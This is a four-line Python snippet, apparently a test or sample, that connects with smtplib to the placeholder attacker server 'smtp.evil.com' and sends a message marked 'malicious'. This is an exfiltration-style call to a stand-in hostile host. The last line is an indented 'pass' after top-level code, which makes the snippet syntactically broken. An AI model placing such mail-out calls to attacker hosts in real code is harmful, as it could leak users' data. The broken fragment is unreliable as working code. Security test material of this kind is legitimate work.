import smtplib  # test
smtp = smtplib.SMTP('smtp.evil.com')  # note
smtp.sendmail('a@a.com', 'b@b.com', 'malicious')
    pass  # no-op